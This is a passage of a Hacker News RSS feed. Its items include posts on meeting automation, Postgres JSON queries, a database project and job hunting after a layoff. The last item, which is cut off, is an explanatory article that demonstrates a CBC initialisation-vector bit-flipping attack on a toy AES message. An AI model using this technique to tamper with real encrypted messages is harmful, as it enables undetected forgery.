<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.concernednetizen.com/2019/01/a-mcluhan-syntonic-approach-to-computer-literacy-toppling-the-pillars-of-cyberspace/">http://www.concernednetizen.com/2019/01/a-mcluhan-syntonic-approach-to-computer-literacy-toppling-the-pillars-of-cyberspace/</a></em></p>]]>
            </description>
            <link>http://www.concernednetizen.com/2019/01/a-mcluhan-syntonic-approach-to-computer-literacy-toppling-the-pillars-of-cyberspace/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534975</guid>
            <pubDate>Sun, 20 Sep 2020 16:34:50 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Stop scrambling and just auto prep your meetings]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534859">thread link</a>) | @iamwil
<br/>
September 20, 2020 | https://automationcookbook.io/stop-scrambling-and-just-auto-prep-your-meetings/ | <a href="https://web.archive.org/web/*/https://automationcookbook.io/stop-scrambling-and-just-auto-prep-your-meetings/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://automationcookbook.io/content/images/size/w300/2020/09/pexels-vlada-karpovich-4050423.jpg 300w,
                            https://automationcookbook.io/content/images/size/w600/2020/09/pexels-vlada-karpovich-4050423.jpg 600w,
                            https://automationcookbook.io/content/images/size/w1000/2020/09/pexels-vlada-karpovich-4050423.jpg 1000w,
                            https://automationcookbook.io/content/images/size/w2000/2020/09/pexels-vlada-karpovich-4050423.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://automationcookbook.io/content/images/size/w2000/2020/09/pexels-vlada-karpovich-4050423.jpg" alt="Stop scrambling and just auto prep your meetings">
            </figure>

            <section>
                <div>
                    <p><em>Running a business has many moving parts. The more you can automate, the more it frees you up to address higher level and strategic problems of your business. This is a newsletter about automating aspects of your business.</em></p><h3 id="story-and-problem">Story and Problem</h3><blockquote>I have Zaps for automatically adding new customers (who purchase books<br>from my online shop) to my email list, and I specify which tags to add<br>to them depending on the product they buy. I have a Zap for creating a<br>new meeting notes document (from a template) for consulting clients in a<br>Google Drive folder as soon as they book a coaching call with me on<br>Calendly, and I'm working on a Zap to remove subscribers from my list<br>the moment they unsubscribe. I'm still in the process of building out<br>workflows but I'm really happy with how it automates several tedious<br>tasks.</blockquote><p>Stephanie Morillo is the creator of <a href="https://www.developersguidetocontent.com/">The Developer's Guide to Content Creation</a>, a book featuring exercises, worksheets, and content helping developers become better content creators.</p><p>She was the main writer for <a href="https://bundler.io/">Bundler</a> and <a href="https://rubygems.org/">RubyGems</a> open source projects, the editor-in-chief of <a href="https://www.digitalocean.com/">DigitalOcean</a> and <a href="https://github.com/">GitHub</a>'s company blogs, as well as a content strategist on Microsoft's Cloud Advocate team. </p><p>In addition to her book, she also sells a complementary service where she does 1 on 1 chats for people looking for more in-depth consultation. Here, she's automated the process of setting up the required notes and documents in preparation for the consultation as soon as a client books her on her <a href="https://calendly.com/">Calendly</a>.</p><p>Do you have recurring meetings where the format is the same? Maybe it's a sale call, or maybe it's a consulting call, where you find that you need to have certain source material, notes, or answers to commonly asked questions. </p><p>Instead of scrambling every time, set up some automation up front, triggered by your Calendly appointment to have every thing you need to be successful in your meetings every time. You'll still need to do any rehearsing, but let these logistics be the least of your worries!</p><h3 id="automation">Automation</h3><p>Calendly easily integrates into a lot of major workflow management software like Integromat or Zapier. Use it to trigger </p><ul><li>adding links to zoom meetings in your Google Calendar</li><li>the creation of template documents for the meeting</li><li>add links answers to commonly asked questions</li><li>numbers and figures that you need to know on these calls. </li><li>or anything else you find you're usually scrambling for.</li></ul><p>For any of these documents, if you do link them in the event, and that event is shared by your counterpart in your meeting, make sure the default permissions is only you! Otherwise, it might get real embarrassing!</p><p>As usual, these are just the tools I've heard of and used before. If you like to find alternatives, here are a couple below.</p><ul><li><a href="https://alternativeto.net/software/zapier/">Zapier Alternatives</a></li><li><a href="https://alternativeto.net/software/calendly/">Calendly Alternatives</a></li></ul><p>Happy Automating! Make your meetings a success!</p><p>[*] Photo by <strong><a href="https://www.pexels.com/photo/empty-bed-with-laptop-and-notebook-4050423/">Vlada Karpovich</a></strong></p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Automation Cookbook</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://automationcookbook.io/stop-scrambling-and-just-auto-prep-your-meetings/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534859</guid>
            <pubDate>Sun, 20 Sep 2020 16:18:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building nested JSON objects with Postgres]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534853">thread link</a>) | @shusson
<br/>
September 20, 2020 | https://shusson.info/post/building-nested-json-objects-with-postgres | <a href="https://web.archive.org/web/*/https://shusson.info/post/building-nested-json-objects-with-postgres">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
  

<p><strong>20/09/2020</strong></p>

<p>Often the application layer will transform normalized data from the db into a hierarchical object. For example many ORMs will support something like <code>formRepository.find({ relations: ["section", "section.question"] });</code>, which will do something like <a href="https://github.com/typeorm/typeorm/blob/c714867d3d0c43ccbb7ca8fb3ce969207e4d5c04/src/query-builder/SelectQueryBuilder.ts#L1926">this</a> behind the scenes. Moving the normalized data between the db and the application layer is redundant. With <a href="https://www.postgresql.org/docs/12/functions-json.html">json functions</a>, postgres can do the transformations instead.</p>

<p>Basic model:</p>
<pre><code>DROP TABLE IF EXISTS question;
DROP TABLE IF EXISTS section;
DROP TABLE IF EXISTS form;


CREATE TABLE form (
    id serial primary key,
    description text
);

CREATE TABLE section (
    id serial primary key,
    name text,
    form_id serial references form(id)
);

CREATE TABLE question (
    id serial primary key,
    name text,
    section_id serial references section(id)
);
</code></pre>

<p>Generate some data:</p>
<pre><code>INSERT INTO
    form (description)
VALUES
    (
        md5(random()::text)
    ),
    (
        md5(random()::text)
    );

INSERT INTO
    section (name, form_id)
SELECT
    md5(random()::text),
    1
FROM
    generate_series(1, 10) s(i);


INSERT INTO
    question (name, section_id)
SELECT
    md5(random()::text),
    floor(i)
FROM
    generate_series(1, 10, 0.2) s(i);
</code></pre>

<p>Fetch the normalized representation of a form:</p>
<pre><code>SELECT
	form.id AS form_id,
	section.id AS section_id,
	question.id AS question_id
FROM form
LEFT JOIN section ON section.form_id = form.id
LEFT JOIN question ON question.section_id = form.id
WHERE form.id = 1;

form_id|section_id|question_id|
-------|----------|-----------|
      1|         1|          1|
      1|         1|          2|
      1|         1|          3|
      1|         1|          4|
...
</code></pre>

<p>Fetch the JSON objects of a form using nested sub-queries:</p>
<pre><code>SELECT row_to_json(forms)
FROM (
    SELECT
    	form.*,
        (
        	SELECT jsonb_agg(nested_section)
        	FROM (
	        	SELECT
		     		section.id,
		     		section.name,
		     		(
		     			SELECT json_agg(nested_question)
		     			FROM (
		     				SELECT
		     				question.id,
		     				question.name
			     			FROM question
			     			where question.section_id = section.id
		     			) AS nested_question
		     		) AS questions
		        FROM section
		        WHERE section.form_id = form.id
        	) AS nested_section
        ) AS sections
    FROM form
) AS forms;
</code></pre>

<p>Each row will look like:</p>
<pre><code>{
    "id": 1,
    "description": "53f6420b9ba0c269a9eb611a47480536",
    "sections": [
        {
            "id": 1,
            "name": "3d670fbce46e67b67a42eb743a700529",
            "questions": [
                {
                    "id": 1,
                    "name": "ee4918cd0b77b3fe2b7a4f5a8fd1c163"
                },
                {
                    "id": 2,
                    "name": "a1337f89c3cb2c369ef959741d5aed33"
                },
                {
                    "id": 3,
                    "name": "c0db64d35a0253561514ee929d813101"
                }
                ...
            ]
        },
    ...
</code></pre>

<p>Alternatively you can use Common Table Expressions:</p>

<pre><code>WITH questions as (
    SELECT
      question.*
    FROM question
    GROUP BY question.id
    order by question.id
), sections AS (
    SELECT
      section.*,
      json_agg(questions) as questions
    FROM section
    LEFT JOIN questions ON questions.section_id = section.id
    GROUP BY section.id
    order by section.id
), forms AS (
    SELECT
      form.*,
      json_agg(sections) as sections
    FROM form
    LEFT JOIN sections ON sections.form_id = form.id
    group by form.id
    order by form.id
)
SELECT row_to_json(forms)
FROM forms;
</code></pre>

<p>In a following blog post I plan to investigate the performance these json functions.</p>

      

  <span><time datetime="2020-09-20T00:00:00+02:00"></time></span>


  
  <!--<span class="meta"><time datetime="2020-09-20T00:00:00+02:00">September 20, 2020</time> &middot; </span>
  -->
</section></div>]]>
            </description>
            <link>https://shusson.info/post/building-nested-json-objects-with-postgres</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534853</guid>
            <pubDate>Sun, 20 Sep 2020 16:16:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[JO-SQL Database]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534692">thread link</a>) | @elvis70
<br/>
September 20, 2020 | http://www.die-schoens.de/prg/josql.html | <a href="https://web.archive.org/web/*/http://www.die-schoens.de/prg/josql.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <center>
      
      <h4>(last updated Jan 13tht 2013) </h4>
   </center>
    <hr size="6">

    <p>
      Welcome to JO-SQL - a versatile multiuser database with reusable parts.
      A presentation about architecture and main feature
      is <a href="http://www.die-schoens.de/prg/JOSQL.ppt">here</a>.
      <br>
      In short, the database
      </p><ul>
	<li>provides configurable multiuser access through shared memory.
	  Most parameters are runtime configurable.
        </li>
	<li>can directly or via a server process access tables. A PERL
	  frontend to the server exists as well.
        </li>
	<li>does table access from the SQL layer via an API so other drivers
	  can be plugged in easily.
        </li>
	<li>comes along with a shell front end for easy use and scripting.
        </li>
	<li>extends SQL with programming facilities to serve as a powerful
	  report generator.
        </li>
	<li>is carefully layered to allow using various parts independently.
	  Various test and demo programs show how to re-use parts for own
	  projects.
        </li>
      </ul>
   
    <p>
      The full tarball including all sources is at
      <a href="http://www.die-schoens.de/prg/josql_full.tgz">JOSQL-full</a>:
      <br>
      A smaller version without server and network library can be found at
      <a href="http://www.die-schoens.de/prg/josql.tgz">JOSQL</a>:
      <br>
      As detailed on the main page, alternatively a Windows version or a merged
      version is available on demand. Just drop me an email.
    </p>

    Any questions, bugs, improvements, mail to
    <em>my-first-name AT die-Schoens DOT de</em>
   

</div>]]>
            </description>
            <link>http://www.die-schoens.de/prg/josql.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534692</guid>
            <pubDate>Sun, 20 Sep 2020 15:56:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Laid Off, Now What?]]>
            </title>
            <description>
<![CDATA[
Score 395 | Comments 355 (<a href="https://news.ycombinator.com/item?id=24534685">thread link</a>) | @bbhat
<br/>
September 20, 2020 | https://bharathpbhat.github.io/2020/09/19/laid-off-now-what.html | <a href="https://web.archive.org/web/*/https://bharathpbhat.github.io/2020/09/19/laid-off-now-what.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>As an immigrant on an H1B, you have exactly 60 days to find a new job when you are laid-off. This is a very short window of time to explore and land any job, let alone a job that matches your skills and interests. I found myself in this situation along with many others when Uber announced <a href="https://www.theverge.com/2020/5/18/21262337/uber-layoff-3000-employees-covid-19-coronavirus">layoffs</a> earlier this year. The following is a recollection of some things that worked well for me during my eventually successful job hunt.</p>
<ul>
<li><a href="#always-be-prepping">Always be Prepping</a></li>
<li><a href="#reach-out-to-everyone">Reaching Out</a></li>
<li><a href="#interview-preparation">Interview Preparation</a></li>
<li><a href="#closing-thoughts">Closing Thoughts</a></li>
</ul>
<h3 id="always-be-prepping">Always be prepping</h3>
<p>Coding interviews are hard to crack if you haven't been prepping, so I was lucky that I had been spending roughly 3-4 hours every week on <a href="http://leetcode.com/">leetcode</a>, from about 2 months before the layoff rumours broke. I was lucky that</p>
<ul>
<li>I knew that I wanted to change jobs in any case and</li>
<li>Rumours of layoffs broke approximately a month before the actual layoffs happened, giving me more lead time to prepare and send out emails to recruiters and friends.</li>
</ul>
<p>Whenever there's an economic downturn, I think it's critical to be acutely aware of what's happening at the company and start preparing for job interviews right away.</p>
<h3 id="reach-out-to-everyone">Reach out to everyone</h3>
<p>One of the hardest things to do when you are laid off is to write to your friends and family seeking help. But if there's ever a time to swallow your pride, then this is it. I reached out to everyone I knew, and told them plainly about my situation, and asked to be recommended to specific roles at their companies, or to tell their friends who may be hiring. I am extremely grateful to the help I got from my network, and the kind messages that I received. So many friends wrote to make sure I was okay, and kept checking in throughout the interview process, and they all have my immense gratitude.</p>
<p>It is tempting to just apply on the careers page when you find relevant roles at a company instead of spending time on finding connections and reaching out to them, but in my experience, it was very much worth it. Response times from recruiters was roughly 1-2 days when I was referred by an employee, whereas applying on the careers page was a hit or miss. One BigCo. took 40 days to respond, while some smaller companies were much quicker (3-4 days).</p>
<h4 id="the-process">The Process</h4>
<p>In terms of companies, cast a wide net because you absolutely need <em>a</em> job before a deadline. The steps are the obvious ones:</p>
<ol>
<li>Make a list of companies</li>
<li>For each company, compile a list of open job profiles that are relevant.</li>
<li>Email/Text a connection at the company, or apply on the careers page if all else fails.</li>
</ol>
<p>I think I reached out to an initial list of 10 companies or so on the day news of the layoffs broke. This worked well because there's at least a week's time before you speak to a hiring manager or interviewer from when you reach out, so there's ample time to prepare.</p>
<p>What companies to reach out to? In my case, it was the usual suspects (FAANG), and then some domain specific ones such as autonomous vehicle companies. The two most common roles that I applied to were:</p>
<ul>
<li><strong>Machine Learning Engineer</strong> - This is a hybrid role with ML + Software Engineering skills needed, and job roles usually talk about some specific domain such as recommendation systems, or in the case of autonomous vehicles, things such as perception or object detection. I typically looked for some mention of Computer Vision, NLP and deep learning.</li>
<li><strong>Machine Learning Infra Engineer</strong> - This role tends to be more on the software systems side, and deals with the infra for training and serving ML models for production workloads.</li>
</ul>
<h3 id="interview-preparation">Interview Preparation</h3>
<ul>
<li><a href="#an-initial-screen-with-the-hiring-manager">Hiring Manager Screen</a></li>
<li><a href="#coding-interviews-phone--onsite">Coding Interviews</a></li>
<li><a href="#machine-learning-interviews">Machine Learning Interviews</a></li>
<li><a href="#behavioral-interviews">Behavioral Interviews</a></li>
</ul>
<p>Interviewing for ML specific roles typically involves a few different kinds of interviews, each of which needs specific preparation. I'm outlining the most common ones I saw below:</p>
<h3 id="an-initial-screen-with-the-hiring-manager">An initial screen with the hiring manager</h3>
<p>Companies that do general interviews (Google / Facebook) don't have this step, but most others do. I personally like this, because it means that you are interviewing for a specific position in a specific team, and there's a high level of engagement from the beginning. Most of these calls were about getting to know me, and making sure I have relevant work experience, while some of them also were rapid fire technical questions. The latter ones were rare, and I encountered them when the manager wasn't certain that I was the right person for the job. In my experience, the introduction is the most important part of this interview (<strong>Tell me about yourself</strong>), and it helps to have prepared intros for each type of role that you are applying to. The idea is to tailor your story to highlight aspects of your work experience that are relevant to the job role. The next most important question is "<strong>What would you like to do in your next role?</strong>". Again, it helps immensely to be prepared to answer this question, and ideally, in a way so that there's reasonable overlap between your answer and what the role offers. Being able to answer this question also provides clarity to the job search process. For example, a consistent theme for me was to be (a) in an impactful / critical role for the company and (b) continue to work with the latest in ML.</p>
<p>Writing and rehearsing your stories often seems unimportant when compared to more tangible preparation steps such as spending time on leetcode, but I believe that it was critical, because it sets the tone and gives you confidence that you have done this in the past, and done it well, and there's no reason for the interviewer to doubt your abilities.</p>
<h3 id="coding-interviews-phone--onsite">Coding Interviews (Phone / Onsite)</h3>
<p>These are the standard leetcode style coding interviews, done using coderpad, or some similar service. The template for these is consistent across all companies, and involves 1 or 2 coding questions (or 1 question with follow-ups) that you are expected to implement and test. Some tips that were helpful for me preparation:</p>
<ol>
<li><strong>Get a premium subscription with leetcode</strong> - It is nice to be able to filter by companies and have access to the entire question bank, and it is good karma. The service is valuable and the creators should be compensated.</li>
<li><strong>Simulate the interview setting as much as possible</strong> - For example, I would set aside a 3 hour block of time for leetcode, shut myself in a room, and do 4 questions, 45 minutes each. If you are unable to solve a question in 45 minutes, you still move on to the next one. No extensions or looking at the solution. Think of it like moving on to the next interviewer. After the 3 hour session is done, go back to the questions as needed, either to look at solutions or to understand them better. A question is <code>Done</code> when your solution passes all the tests on leetcode and is <code>Accepted</code>.</li>
<li><strong>Talk out loud</strong> - This is big. Again, assuming that you are in an actual interview, talk out loud about the process you are using during these practice sessions. Talking out loud helps massively because you are forced to put your current train of thought into words, and it is often evident when a solution isn't justifiable.</li>
<li><strong>How to pick questions?</strong> - I filtered for questions that were tagged <code>Hard</code>, and then picked at random. No filter for company, or problem type. I went from doing all Mediums to a mix of Mediums and Hard to all Hards over a span of 4-5 weeks.</li>
<li><strong>How many questions to do?</strong> - In the first 2-3 weeks of my prep, I was doing 4 questions on one of the weekend days, and once I had more time post the lay-off news, it was 4 questions every 3 days or so. Overall, my stats look so:</li>
</ol>
<p><img src="https://bharathpbhat.github.io/assets/images/leetcode_xp.png" alt="Leetcode stats"></p>
<h3 id="machine-learning-interviews">Machine Learning Interviews</h3>
<p>These typically come in two flavors:</p>
<h4 id="concepts--basics">Concepts / Basics</h4>
<p>These are kind of like rapid fire questions where the interviewer will quiz you about ML basics. Some questions that I recall right now, to give a flavor of things:</p>
<pre><code>- What are some unsupervised learning methods?
- What is underfitting / overfitting?
- What is batch normalization? What's the motivation behind it?
- What is dropout? 
- What optimizers have you used? And typically some follow-up like, why does momentum make sense?
- What are some object detection techniques / papers that you are familiar with? (Computer Vision specific)
- What are decision trees? 
- How does logistic regression work?
- How do you train a linear regression model?
- What are some loss functions that you are familiar with?
- Why does Cross Entropy loss make sense?
- What are residual networks?
</code></pre>
<p>These are usually follow up questions where the interviewer will try to dig deeper into these concepts, often picking on some portion of the initial answer.</p>
<p>I did a lot of reading, and then some writing with a pen and paper for this part of the interview. If I am already somewhat/fairly familiar with a topic, like say, object detection, then my process was:</p>
<ol>
<li><strong>Write</strong> from memory a summary of what I remember about the topic</li>
<li>Note down <strong>questions</strong> for the parts that I am not clear about</li>
<li><strong>Read</strong> about the topic, and fill in whatever I missed on first go.</li>
</ol>
<p>If I don't remember much about a topic at all, like say, multi-armed bandits, then I would do step (3) first, and then do steps (1) and (2) a few days later, and eventually repeating step (3) as needed.</p>
<p>It helps to start with a list of topics that you want do this for. This list will grow as you remember more topics or expand the list of companies you are interviewing at. For reference, the list of topics I looked at is <a href="https://bharathpbhat.github.io/assets/files/index_card.pdf">here</a>, and a sample of the handwritten notes I made is here, for <a href="https://bharathpbhat.github.io/assets/files/rec_sys.pdf">recommendation systems</a>.</p>
<h4 id="ml-system-design">ML System Design</h4>
<p>This is my favorite interview, and corresponds neatly to skills used day to day as a ML practitioner. These are typically open ended interviews where the candidate is expected to design a product with some ML at its core. For example, things like:</p>
<pre><code>- Let's build a model that ranks photos in your photo library based on quality.
- How would you build a model that identifies pedestrians from drone imagery?
- Let's build a model that can does face detection for a user's photo library.
- How do you build a model that automatically picks out …</code></pre></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bharathpbhat.github.io/2020/09/19/laid-off-now-what.html">https://bharathpbhat.github.io/2020/09/19/laid-off-now-what.html</a></em></p>]]>
            </description>
            <link>https://bharathpbhat.github.io/2020/09/19/laid-off-now-what.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534685</guid>
            <pubDate>Sun, 20 Sep 2020 15:54:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dreamhack Starcraft 2 Masters 2020 Fall: Season Finals [live]]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24534657">thread link</a>) | @tosh
<br/>
September 20, 2020 | https://www.twitch.tv/esl_sc2 | <a href="https://web.archive.org/web/*/https://www.twitch.tv/esl_sc2">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.twitch.tv/esl_sc2</link>
            <guid isPermaLink="false">hacker-news-small-sites-24534657</guid>
            <pubDate>Sun, 20 Sep 2020 15:49:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why is unauthenticated encryption insecure?]]>
            </title>
            <description>
<![CDATA[
Score 63 | Comments 36 (<a href="https://news.ycombinator.com/item?id=24534619">thread link</a>) | @todsacerdoti
<br/>
September 20, 2020 | https://cybergibbons.com/reverse-engineering-2/why-is-unauthenticated-encryption-insecure/ | <a href="https://web.archive.org/web/*/https://cybergibbons.com/reverse-engineering-2/why-is-unauthenticated-encryption-insecure/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		
<p>Cryptography is a complex subject. There are many subtle issues that can be introduced if you don’t know what you are doing.</p>



<p>There is a common mantra: “don’t roll your own crypto”. This is because both inexperienced and experienced developers frequently build cryptographic systems that are insecure.</p>



<p>However, there has to be a line – when does it start becoming “rolling your own”? Particularly in embedded systems, there are times when custom protocols need to be used, and developers stray into the dangerous area of cryptography.</p>



<p>One of the most common mistakes we have seen is the use of unauthenticated encryption.</p>



<h3>What is encryption?</h3>



<p>Encryption is encoding a plaintext into a ciphertext using a key, with the goal of keeping the plaintext confidential.</p>



<p>Only someone with the correct key should be able to decrypt the ciphertext and turn it back into plaintext.</p>



<p>Encryption provides confidentiality. It stops someone working out what the message is.</p>



<h3>So what’s the issue?</h3>



<p>An attacker can modify the ciphertext and cause the plaintext to change. There is no inherent means in encryption to detect this change.</p>



<p>Encryption does not provide authenticity. You cannot check that the message is genuine and has not been tampered with.</p>



<h3>What can an attacker do with this?</h3>



<p>I’m going to describe one attack against unauthenticated encryption.</p>



<p>Many encryption algorithms only operate on fixed-size blocks of data – they are called <a href="https://en.wikipedia.org/wiki/Block_cipher">block ciphers</a>. To encrypt longer lengths of data, a <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">mode of operation</a> is used to apply the block cipher repeatedly.</p>



<p>One mode of operation is called <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Cipher_block_chaining_(CBC)">CBC</a> (Cipher Block Chaining). When encrypting the data, the previous ciphertext block is mixed into the current plaintext block using an operation called “<a href="https://en.wikipedia.org/wiki/Exclusive_or">exclusive OR</a>“. This is denoted with the + in a circle in diagrams.</p>



<figure><img src="https://upload.wikimedia.org/wikipedia/commons/8/80/CBC_encryption.svg" alt=""></figure>



<p>There is also an input called the initialisation vector, or IV. This is a random input to the algorithm, and is intended to ensure that the ciphertext is different, even if the same plaintext is encrypted. This prevents leaking information about the content.</p>



<p>The initialisation vector is transmitted alongside the ciphertext.</p>



<p>Decryption is similar. The previous ciphertext block is exclusive ORed with the output of the block cipher to obtain the plaintext.</p>



<figure><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/CBC_decryption.svg/1200px-CBC_decryption.svg.png" alt=""></figure>



<p>Exclusive OR is a deterministic operation. If we look at a single bit, then it operates as follows:</p>



<figure><table><tbody><tr><td>A</td><td>B</td><td>Output</td></tr><tr><td>0</td><td>0</td><td>0</td></tr><tr><td>0</td><td>1</td><td>1</td></tr><tr><td>1</td><td>0</td><td>1</td></tr><tr><td>1</td><td>1</td><td>0</td></tr></tbody></table></figure>



<p>I always think of this as “if one input is high, invert the other input, otherwise leave it alone”.</p>



<p>The operation is carried out for each bit in a byte.</p>



<pre><code>A: 0 1 0 1 1 0 0 1 (0x59)
B: 1 1 1 1 0 0 0 0 (0xF0)
O: 1 0 1 0 1 0 0 1 (0xA9)</code></pre>



<p>What this means is that modifying one of the inputs to exclusive OR results in a predictable change to the output. And the operation can be easily reversed.</p>



<pre><code>A: 0123456789ABCDEF
B: FFFF00FFF00F0FF0
O: FEDC459879A4C21F</code></pre>



<p>If we now exclusive OR the output with one of the inputs:</p>



<pre><code>A: FEDC459879A4C21F
B: FFFF00FFF00F0FF0
O: 0123456789ABCDEF</code></pre>



<p>Hopefully that explains exclusive OR.</p>



<p>Let’s look back to how CBC uses this in decryption. In the first block, the IV is exclusive ORed with the output of the block cipher. The IV is transmitted alongside the ciphertext and an attacker can modify both at at will.</p>



<figure><img loading="lazy" width="922" height="786" src="https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-14.55.37.png" alt="" srcset="https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-14.55.37.png 922w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-14.55.37-300x256.png 300w, https://cybergibbons.com/wp-content/uploads/2020/09/Screenshot-2020-09-20-at-14.55.37-768x655.png 768w" sizes="(max-width: 922px) 100vw, 922px"></figure>



<p>We can encrypt the string “A dog’s breakfast” using a key and the initialisation vector of all 0x00 (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Encrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Raw','Hex')&amp;input=QSBkb2cncyBicmVha2Zhc3Q">here</a> on CyberChef).</p>



<pre><code>Key: 0123456789ABCDEF0123456789ABCDEF
IV:  0000000000000000000000000000000
Plaintext: A dog's breakfast
Ciphertext: c7b1d96f0f520f33faaccfdc107f718aafe8892c3a29c76b0732a760a0f54f50</code></pre>



<p>Of course, this can be decrypted (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=YzdiMWQ5NmYwZjUyMGYzM2ZhYWNjZmRjMTA3ZjcxOGFhZmU4ODkyYzNhMjljNzZiMDczMmE3NjBhMGY1NGY1MA">here</a> on CyberChef).</p>



<p>If I change just one byte in the ciphertext, the entire message is corrupted (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=YzdiMmQ5NmYwZjUyMGYzM2ZhYWNjZmRjMTA3ZjcxOGFhZmU4ODkyYzNhMjljNzZiMDczMmE3NjBhMGY1NGY1MA">here</a> on Cyberchef). There’s no way for me to predictably modify this plaintext by changing the ciphertext.</p>



<pre><code>Key: 0123456789ABCDEF0123456789ABCDEF
IV:  0000000000000000000000000000000
Ciphertext: c7b2d96f0f520f33faaccfdc107f718aafe8892c3a29c76b0732a760a0f54f50
Plaintext: .L...Q½êU...ì7Ò.t</code></pre>



<p>But the attacker also has control over the IV. Let’s set the first byte of the IV to 0xFF (<a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'FF00000000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=YzdiMWQ5NmYwZjUyMGYzM2ZhYWNjZmRjMTA3ZjcxOGFhZmU4ODkyYzNhMjljNzZiMDczMmE3NjBhMGY1NGY1MA">here</a> on CyberChef). Only the first byte of the plaintext has changed!</p>



<pre><code>Key: 0123456789ABCDEF0123456789ABCDEF
IV:  FF00000000000000000000000000000
Ciphertext: c7b1d96f0f520f33faaccfdc107f718aafe8892c3a29c76b0732a760a0f54f50
Plaintext: ¾ dog's breakfast</code></pre>



<p>And it has changed predictably. The capital A (ASCII 0x41) has been exclusive ORed with 0xFF to become 0xBE (which decodes as ¾ although it’s above the normal ASCII range).</p>



<pre><code>A: 0 1 0 0 0 0 0 1 (0x41)
B: 1 1 1 1 1 1 1 1 (0xFF)
O: 1 0 1 1 1 1 1 0 (0xBE)</code></pre>



<p>This is a very high level of control! The attacker can now modify the plaintext without detection. Let’s try and significantly change the meaning of it.</p>



<p>The original message contained “A dog’s breakfast”. Can we change this canine feast into a feline one?</p>



<p>We exclusive OR the original plaintext with the desired one (<a href="https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'UTF8','string':'The%20cat%5C's%20breakfast'%7D,'Standard',false)To_Hex('Space',0)&amp;input=VGhlIGRvZydzIGJyZWFrZmFzdA">here</a> on CyberChef). Notice how the output only has value for the characters we have changed.</p>



<pre><code>Original: A. .d.o.g.'.s. .b.r.e.a.k.f.a.s.t.
Original: 4120646f67277320627265616b66617374
Desired:  A. .c.a.t.'.s. .b.r.e.a.k.f.a.s.t.
Desired:  4120636174277320627265616b66617374
Output:   0000070e13000000000000000000000000</code></pre>



<p>Pop that output in as the IV to the decryption, and we’ve successfully changed the message (here on <a href="https://gchq.github.io/CyberChef/#recipe=AES_Decrypt(%7B'option':'Hex','string':'0123456789ABCDEF0123456789ABCDEF'%7D,%7B'option':'Hex','string':'0000070e13000000000000000000000000'%7D,'CBC','Hex','Raw',%7B'option':'Hex','string':''%7D)&amp;input=YzdiMWQ5NmYwZjUyMGYzM2ZhYWNjZmRjMTA3ZjcxOGFhZmU4ODkyYzNhMjljNzZiMDczMmE3NjBhMGY1NGY1MA">CyberChef</a>). All of this without even knowing the key.</p>



<pre><code>Key: 0123456789ABCDEF0123456789ABCDEF
IV:  0000070e130000000000000000000000
